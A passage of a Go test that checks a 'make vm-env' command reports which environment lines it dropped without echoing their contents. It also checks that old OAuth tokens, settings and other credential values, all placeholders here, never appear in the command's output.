			t.Errorf("make vm-env's output prints the line it dropped from daemon.env: the output must name what it kept and say that it dropped lines, never reproduce the content of a line it refused, which may hold a command or a secret (issue #234)\nstdout: %s\nstderr: %s",
				stdout, stderr)
		}
	}

	assertNoSecrets(t, "make vm-env VM_ENV=DEEPSEEK_API_KEY's output", stdout+stderr, []secret{
		{kind: "earlier value of CLAUDE_CODE_OAUTH_TOKEN", value: "old-oauth"},
		{kind: "earlier value of INVENTED_SETTING", value: "old-value"},
	})

	assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
}
